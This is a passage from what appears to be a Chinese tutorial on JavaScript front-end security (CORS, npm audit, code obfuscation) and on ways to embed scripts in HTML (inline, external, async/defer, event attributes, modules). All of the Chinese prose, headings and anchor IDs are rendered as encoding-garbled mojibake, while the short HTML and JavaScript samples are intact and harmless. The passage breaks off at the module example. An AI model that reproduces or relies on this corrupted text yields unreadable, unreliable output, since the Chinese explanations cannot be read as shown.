OAuthï¼‰è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶ç¡®ä¿æ¯ä¸ªè¯·æ±‚éƒ½å¸¦æœ‰åˆæ³•çš„èº«ä»½éªŒè¯ä»¤ç‰Œã€‚</li></ul></li><li><p><strong>é™åˆ¶è¯·æ±‚æ¥æº</strong>ï¼š</p><ul><li>ä½¿ç”¨ CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰å¤´ï¼ŒæŒ‡å®šå“ªäº›åŸŸåå¯ä»¥åˆæ³•è®¿é—® APIã€‚ç¡®ä¿æœåŠ¡å™¨åªæ¥å—æ¥è‡ªå¯ä¿¡åŸŸçš„è¯·æ±‚ï¼Œé˜²æ­¢æ¶æ„ç½‘ç«™æ»¥ç”¨ APIã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://trusted-domain.com;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="å…­ã€ä¾èµ–å’Œç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ€§"><a href="#å…­ã€ä¾èµ–å’Œç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ€§" class="headerlink" title="å…­ã€ä¾èµ–å’Œç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ€§"></a>å…­ã€ä¾èµ–å’Œç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ€§</h3><p>JavaScript é¡¹ç›®ä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶ï¼Œå¿…é¡»ç¡®ä¿è¿™äº›åº“æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½åŒ…å«æ¼æ´æˆ–æ¶æ„ä»£ç ã€‚</p><h4 id="6-1-å®¡æŸ¥å’Œæ›´æ–°ä¾èµ–åº“"><a href="#6-1-å®¡æŸ¥å’Œæ›´æ–°ä¾èµ–åº“" class="headerlink" title="6.1 å®¡æŸ¥å’Œæ›´æ–°ä¾èµ–åº“"></a>6.1 å®¡æŸ¥å’Œæ›´æ–°ä¾èµ–åº“</h4><ol><li><p><strong>å®šæœŸæ›´æ–°ç¬¬ä¸‰æ–¹åº“</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>npm audit</code> æˆ–ç±»ä¼¼å·¥å…·ï¼Œå®šæœŸæ£€æŸ¥é¡¹ç›®ä¸­æ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ›´æ–°åˆ°æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬ï¼Œä»¥ä¿®è¡¥å·²çŸ¥çš„å®‰å…¨é—®é¢˜ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm audit fix<br></code></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨å—ä¿¡ä»»çš„åº“æº</strong>ï¼š</p><ul><li>åªä»å¯ä¿¡èµ–çš„æºä¸‹è½½å’Œå®‰è£…åº“ã€‚é¿å…ä½¿ç”¨æ¥æºä¸æ˜çš„åº“ï¼Œé˜²æ­¢ä¾›åº”é“¾æ”»å‡»ï¼ˆä¾›åº”é“¾æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡ä¿®æ”¹åˆæ³•è½¯ä»¶åŒ…çš„ä»£ç æ¥ä¼ æ’­æ¶æ„è½¯ä»¶ï¼‰ã€‚</li></ul></li><li><p><strong>ç§»é™¤æœªä½¿ç”¨çš„ä¾èµ–</strong>ï¼š</p><ul><li>ä¸ä½¿ç”¨çš„åº“å’Œä»£ç å¯èƒ½æˆä¸ºæ½œåœ¨çš„å®‰å…¨éšæ‚£ã€‚å®šæœŸæ¸…ç†é¡¹ç›®ï¼Œç¡®ä¿åªä¿ç•™å¿…è¦çš„ä¾èµ–é¡¹ã€‚</li></ul></li></ol><hr><h3 id="ä¸ƒã€å‰ç«¯ä»£ç çš„æ··æ·†ä¸ä¿æŠ¤"><a href="#ä¸ƒã€å‰ç«¯ä»£ç çš„æ··æ·†ä¸ä¿æŠ¤" class="headerlink" title="ä¸ƒã€å‰ç«¯ä»£ç çš„æ··æ·†ä¸ä¿æŠ¤"></a>ä¸ƒã€å‰ç«¯ä»£ç çš„æ··æ·†ä¸ä¿æŠ¤</h3><p>å‰ç«¯ä»£ç æ˜¯å®Œå…¨å…¬å¼€çš„ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥æŸ¥çœ‹æºç ã€‚å› æ­¤ï¼Œåœ¨æŸäº›æ•æ„Ÿåº”ç”¨åœºæ™¯ä¸‹ï¼Œåº”è€ƒè™‘å¯¹å‰ç«¯ JavaScript ä»£ç è¿›è¡Œæ··æ·†ï¼Œå¢åŠ åå‘å·¥ç¨‹çš„éš¾åº¦ã€‚</p><h4 id="7-1-ä»£ç æ··æ·†å’Œå‹ç¼©"><a href="#7-1-ä»£ç æ··æ·†å’Œå‹ç¼©" class="headerlink" title="7.1 ä»£ç æ··æ·†å’Œå‹ç¼©"></a>7.1 ä»£ç æ··æ·†å’Œå‹ç¼©</h4><ol><li><p><strong>ä½¿ç”¨å·¥å…·æ··æ·†ä»£ç </strong>ï¼š</p><ul><li>ä½¿ç”¨å·¥å…·å¦‚ UglifyJS æˆ– Terser æ¥å‹ç¼©å’Œæ··æ·† JavaScript ä»£ç ï¼Œä½¿å…¶éš¾ä»¥è¢«ç†è§£ã€‚è¿™å¯ä»¥é˜²æ­¢ä¸€äº›ä½æ°´å¹³çš„æ”»å‡»è€…ç›´æ¥æŸ¥çœ‹ä»£ç é€»è¾‘ã€‚</li></ul></li><li><p><strong>è°¨æ…ä½¿ç”¨æ•æ„Ÿæ•°æ®</strong>ï¼š</p><ul><li>å³ä¾¿è¿›è¡Œäº†æ··æ·†ï¼Œæ•æ„Ÿé€»è¾‘æˆ–æ•°æ®ä»ç„¶ä¸åº”è¯¥æ”¾ç½®åœ¨å‰ç«¯ä»£ç ä¸­ã€‚åº”ç¡®ä¿æ‰€æœ‰æ•æ„Ÿé€»è¾‘å°½å¯èƒ½æ”¾ç½®åœ¨åç«¯æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</li></ul></li></ol><hr><p>å°† JavaScript åµŒå…¥ HTML æœ‰å¤šç§æ–¹å¼ï¼Œæ¯ç§æ–¹å¼éƒ½é€‚ç”¨äºä¸åŒçš„åœºæ™¯ï¼Œå…·ä½“çš„é€‰æ‹©å–å†³äºä»£ç çš„å¤§å°ã€å¤ç”¨éœ€æ±‚ä»¥åŠæ€§èƒ½ä¼˜åŒ–çš„è€ƒè™‘ã€‚ä»¥ä¸‹æ˜¯å°† JavaScript åµŒå…¥ HTML çš„å‡ ç§ä¸»è¦æ–¹å¼ï¼Œä»¥åŠå®ƒä»¬çš„ç”¨æ³•å’Œé€‚ç”¨åœºæ™¯ã€‚</p><h3 id="1-å†…è”-JavaScript"><a href="#1-å†…è”-JavaScript" class="headerlink" title="1. å†…è” JavaScript"></a>1. <strong>å†…è” JavaScript</strong></h3><p>å†…è” JavaScript æ˜¯å°† JavaScript ä»£ç ç›´æ¥åµŒå…¥åˆ° HTML æ ‡ç­¾çš„ <code>script</code> å…ƒç´ ä¸­ã€‚è¿™ç§æ–¹æ³•ç®€å•ç›´è§‚ï¼Œé€‚ç”¨äºå°‘é‡çš„è„šæœ¬ä»£ç ã€‚</p><h4 id="ç”¨æ³•ï¼š"><a href="#ç”¨æ³•ï¼š" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Inline JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, World!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// è¿™æ˜¯å†…è” JavaScript ä»£ç </span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This is an inline JavaScript script.&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é€‚ç”¨åœºæ™¯ï¼š"><a href="#é€‚ç”¨åœºæ™¯ï¼š" class="headerlink" title="é€‚ç”¨åœºæ™¯ï¼š"></a>é€‚ç”¨åœºæ™¯ï¼š</h4><ul><li>å½“ JavaScript ä»£ç é‡è¾ƒå°‘æ—¶ï¼Œä¾‹å¦‚ä¸€ä¸ªç®€å•çš„äº¤äº’ã€‚</li><li>ä¸´æ—¶æˆ–å¿«é€Ÿæµ‹è¯•å°åŠŸèƒ½çš„åœºæ™¯ã€‚</li></ul><h4 id="æ³¨æ„äº‹é¡¹ï¼š"><a href="#æ³¨æ„äº‹é¡¹ï¼š" class="headerlink" title="æ³¨æ„äº‹é¡¹ï¼š"></a>æ³¨æ„äº‹é¡¹ï¼š</h4><ul><li><strong>å¯ç»´æŠ¤æ€§å·®</strong>ï¼šå¦‚æœä»£ç é‡è¾ƒå¤§ï¼Œå†…è”ä»£ç ä¼šä½¿ HTML æ–‡ä»¶éš¾ä»¥ç»´æŠ¤å’Œé˜…è¯»ã€‚</li><li><strong>å®‰å…¨æ€§é—®é¢˜</strong>ï¼šç”±äºä»£ç ç›´æ¥åµŒå…¥åˆ° HTML ä¸­ï¼Œå®¹æ˜“å—åˆ°è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚åº”è¯¥è°¨æ…ä½¿ç”¨ï¼Œé¿å…ç›´æ¥æ’å…¥ç”¨æˆ·è¾“å…¥æ•°æ®ã€‚</li></ul><hr><h3 id="2-å¤–éƒ¨-JavaScript-æ–‡ä»¶"><a href="#2-å¤–éƒ¨-JavaScript-æ–‡ä»¶" class="headerlink" title="2. å¤–éƒ¨ JavaScript æ–‡ä»¶"></a>2. <strong>å¤–éƒ¨ JavaScript æ–‡ä»¶</strong></h3><p>å¤–éƒ¨ JavaScript æ˜¯å°† JavaScript ä»£ç æ”¾åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œå¹¶é€šè¿‡ <code>&lt;script&gt;</code> æ ‡ç­¾å¼•å…¥ã€‚è¿™ç§æ–¹å¼æœ‰åˆ©äºä»£ç çš„å¤ç”¨ã€ç®¡ç†å’Œç»´æŠ¤ã€‚</p><h4 id="ç”¨æ³•ï¼š-1"><a href="#ç”¨æ³•ï¼š-1" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªå¤–éƒ¨ JavaScript æ–‡ä»¶ï¼Œå¦‚ <code>script.js</code>ï¼Œå¹¶ç¼–å†™ä»£ç ï¼š</p><p><strong><code>script.js</code> æ–‡ä»¶ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªå¤–éƒ¨ JavaScript æ–‡ä»¶</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This script is from an external JavaScript file.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨ HTML ä¸­å¼•å…¥è¯¥å¤–éƒ¨æ–‡ä»¶ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>External JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥å¤–éƒ¨ JavaScript æ–‡ä»¶ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, External Script!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é€‚ç”¨åœºæ™¯ï¼š-1"><a href="#é€‚ç”¨åœºæ™¯ï¼š-1" class="headerlink" title="é€‚ç”¨åœºæ™¯ï¼š"></a>é€‚ç”¨åœºæ™¯ï¼š</h4><ul><li>å½“ JavaScript ä»£ç é‡è¾ƒå¤§æ—¶ï¼Œæˆ–éœ€è¦å¤šä¸ªé¡µé¢å…±äº«ç›¸åŒçš„ JavaScript ä»£ç æ—¶ã€‚</li><li>å¤–éƒ¨æ–‡ä»¶æ›´æ˜“äºç‰ˆæœ¬æ§åˆ¶ã€å›¢é˜Ÿåä½œå’Œæ€§èƒ½ä¼˜åŒ–ï¼ˆä¾‹å¦‚æµè§ˆå™¨ç¼“å­˜ JavaScript æ–‡ä»¶ï¼‰ã€‚</li></ul><h4 id="æ³¨æ„äº‹é¡¹ï¼š-1"><a href="#æ³¨æ„äº‹é¡¹ï¼š-1" class="headerlink" title="æ³¨æ„äº‹é¡¹ï¼š"></a>æ³¨æ„äº‹é¡¹ï¼š</h4><ul><li><strong>æ–‡ä»¶åŠ è½½é¡ºåº</strong>ï¼šå¤–éƒ¨è„šæœ¬åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯åŒæ­¥åŠ è½½çš„ï¼Œè¿™æ„å‘³ç€ HTML çš„è§£æä¼šç­‰å¾… JavaScript æ–‡ä»¶çš„åŠ è½½å’Œæ‰§è¡Œå®Œæˆã€‚åœ¨å¤§æ–‡ä»¶æˆ–ç½‘ç»œè¾ƒæ…¢æ—¶ï¼Œè¿™ä¼šå½±å“é¡µé¢åŠ è½½é€Ÿåº¦ã€‚å¯ä»¥é€šè¿‡ <code>async</code> æˆ– <code>defer</code> å±æ€§æ¥ä¼˜åŒ–åŠ è½½ã€‚</li></ul><hr><h3 id="3-å¼‚æ­¥ä¸å»¶è¿ŸåŠ è½½-JavaScriptï¼ˆasync-å’Œ-deferï¼‰"><a href="#3-å¼‚æ­¥ä¸å»¶è¿ŸåŠ è½½-JavaScriptï¼ˆasync-å’Œ-deferï¼‰" class="headerlink" title="3. å¼‚æ­¥ä¸å»¶è¿ŸåŠ è½½ JavaScriptï¼ˆasync å’Œ deferï¼‰"></a>3. <strong>å¼‚æ­¥ä¸å»¶è¿ŸåŠ è½½ JavaScriptï¼ˆasync å’Œ deferï¼‰</strong></h3><p>ä¸ºäº†ä¼˜åŒ–é¡µé¢åŠ è½½æ€§èƒ½ï¼Œå¤–éƒ¨ JavaScript æ–‡ä»¶å¯ä»¥ä½¿ç”¨ <code>async</code> æˆ– <code>defer</code> å±æ€§ï¼Œè¿™ä¸¤ä¸ªå±æ€§æ§åˆ¶è„šæœ¬çš„åŠ è½½å’Œæ‰§è¡Œæ—¶æœºã€‚</p><h4 id="3-1-async-å±æ€§"><a href="#3-1-async-å±æ€§" class="headerlink" title="3.1 async å±æ€§"></a>3.1 <code>async</code> å±æ€§</h4><p><code>async</code> ä¼šè®©è„šæœ¬æ–‡ä»¶å¼‚æ­¥åŠ è½½ï¼ŒåŠ è½½å®Œæˆåç«‹å³æ‰§è¡Œã€‚è¿™æ„å‘³ç€è„šæœ¬çš„æ‰§è¡Œé¡ºåºå¯èƒ½ä¸ HTML çš„åŠ è½½é¡ºåºä¸ä¸€è‡´ã€‚</p><h4 id="ç”¨æ³•ï¼š-2"><a href="#ç”¨æ³•ï¼š-2" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ç‰¹ç‚¹ï¼š"><a href="#ç‰¹ç‚¹ï¼š" class="headerlink" title="ç‰¹ç‚¹ï¼š"></a>ç‰¹ç‚¹ï¼š</h4><ul><li>è„šæœ¬ä¸ HTML å¹¶è¡ŒåŠ è½½ï¼Œä¸”è„šæœ¬åœ¨åŠ è½½å®Œåç«‹å³æ‰§è¡Œã€‚</li><li>é€‚ç”¨äºä¸ä¼šä¾èµ– DOM çš„ç‹¬ç«‹è„šæœ¬ï¼Œæ¯”å¦‚åˆ†æå·¥å…·ã€å¹¿å‘Šä»£ç ç­‰ã€‚</li></ul><h4 id="3-2-defer-å±æ€§"><a href="#3-2-defer-å±æ€§" class="headerlink" title="3.2 defer å±æ€§"></a>3.2 <code>defer</code> å±æ€§</h4><p><code>defer</code> å±æ€§ä¹Ÿè®©è„šæœ¬æ–‡ä»¶å¼‚æ­¥åŠ è½½ï¼Œä½†å®ƒä¿è¯è„šæœ¬åœ¨ HTML æ–‡æ¡£å®Œå…¨è§£æåæ‰ä¼šæ‰§è¡Œï¼Œä¸”æŒ‰é¡ºåºæ‰§è¡Œã€‚</p><h4 id="ç”¨æ³•ï¼š-3"><a href="#ç”¨æ³•ï¼š-3" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ç‰¹ç‚¹ï¼š-1"><a href="#ç‰¹ç‚¹ï¼š-1" class="headerlink" title="ç‰¹ç‚¹ï¼š"></a>ç‰¹ç‚¹ï¼š</h4><ul><li><code>defer</code> ä¿è¯è„šæœ¬æŒ‰é¡ºåºæ‰§è¡Œï¼Œä¸”ä¸ä¼šé˜»å¡ HTML çš„è§£æã€‚</li><li>é€‚ç”¨äºä¾èµ– DOM çš„ JavaScript æ–‡ä»¶ã€‚</li></ul><h4 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Defer and Async Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script1.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script2.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Async vs Defer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-äº‹ä»¶å±æ€§ä¸­çš„-JavaScript"><a href="#4-äº‹ä»¶å±æ€§ä¸­çš„-JavaScript" class="headerlink" title="4. äº‹ä»¶å±æ€§ä¸­çš„ JavaScript"></a>4. <strong>äº‹ä»¶å±æ€§ä¸­çš„ JavaScript</strong></h3><p>JavaScript ä»£ç è¿˜å¯ä»¥ç›´æ¥åµŒå…¥åˆ° HTML å…ƒç´ çš„äº‹ä»¶å±æ€§ä¸­ï¼ˆå¦‚ <code>onclick</code>ã€<code>onchange</code> ç­‰ï¼‰ã€‚è¿™ç§æ–¹å¼ç›´æ¥å°† JavaScript å†™å…¥å…ƒç´ çš„å±æ€§å€¼ä¸­ï¼Œå¸¸ç”¨äºå¤„ç†ç®€å•çš„äº‹ä»¶å“åº”ã€‚</p><h4 id="ç”¨æ³•ï¼š-4"><a href="#ç”¨æ³•ï¼š-4" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Event Attribute Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é€‚ç”¨åœºæ™¯ï¼š-2"><a href="#é€‚ç”¨åœºæ™¯ï¼š-2" class="headerlink" title="é€‚ç”¨åœºæ™¯ï¼š"></a>é€‚ç”¨åœºæ™¯ï¼š</h4><ul><li>é€‚ç”¨äºç®€å•çš„äº‹ä»¶å¤„ç†ï¼Œæ¯”å¦‚æŒ‰é’®ç‚¹å‡»æ—¶å¼¹å‡ºæç¤ºæ¡†ã€‚</li><li>å¿«é€Ÿå®ç°å°çš„äº¤äº’åŠŸèƒ½ã€‚</li></ul><h4 id="æ³¨æ„äº‹é¡¹ï¼š-2"><a href="#æ³¨æ„äº‹é¡¹ï¼š-2" class="headerlink" title="æ³¨æ„äº‹é¡¹ï¼š"></a>æ³¨æ„äº‹é¡¹ï¼š</h4><ul><li><strong>å¯ç»´æŠ¤æ€§å·®</strong>ï¼šå°† JavaScript ç›´æ¥å†™åœ¨ HTML ä¸­ä¼šä½¿å¾—ä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œå°¤å…¶æ˜¯åœ¨å¤æ‚åº”ç”¨ä¸­ï¼Œäº‹ä»¶å¤„ç†åº”é€šè¿‡å¤–éƒ¨è„šæœ¬æˆ–äº‹ä»¶ç›‘å¬å™¨å®Œæˆã€‚</li><li><strong>å®‰å…¨æ€§é—®é¢˜</strong>ï¼šä¸å†…è” JavaScript ç±»ä¼¼ï¼Œå®¹æ˜“å¯¼è‡´ XSS æ”»å‡»ã€‚</li></ul><hr><h3 id="5-æ¨¡å—åŒ–-JavaScript"><a href="#5-æ¨¡å—åŒ–-JavaScript" class="headerlink" title="5. æ¨¡å—åŒ– JavaScript (&lt;script type=&quot;module&quot;&gt;)"></a>5. <strong>æ¨¡å—åŒ– JavaScript (<code>&lt;script type=&quot;module&quot;&gt;</code>)</strong></h3><p>ES6 å¼•å…¥äº†æ¨¡å—ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡ <code>&lt;script type=&quot;module&quot;&gt;</code> æ¥åŠ è½½ JavaScript æ¨¡å—æ–‡ä»¶ã€‚è¿™ç§æ–¹å¼è®©å¼€å‘è€…èƒ½å¤Ÿä½¿ç”¨æ¨¡å—åŒ–çš„ä»£ç ç»„ç»‡æ–¹å¼ï¼Œä»è€Œæ›´å¥½åœ°ç®¡ç†å¤§å‹é¡¹ç›®çš„ä¾èµ–ã€‚</p><h4 id="ç”¨æ³•ï¼š-5"><a href="#ç”¨æ³•ï¼š-5" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ¨¡å—æ–‡ä»¶ <code>module.js</code>ï¼š</p><p><strong><code>module.js</code> 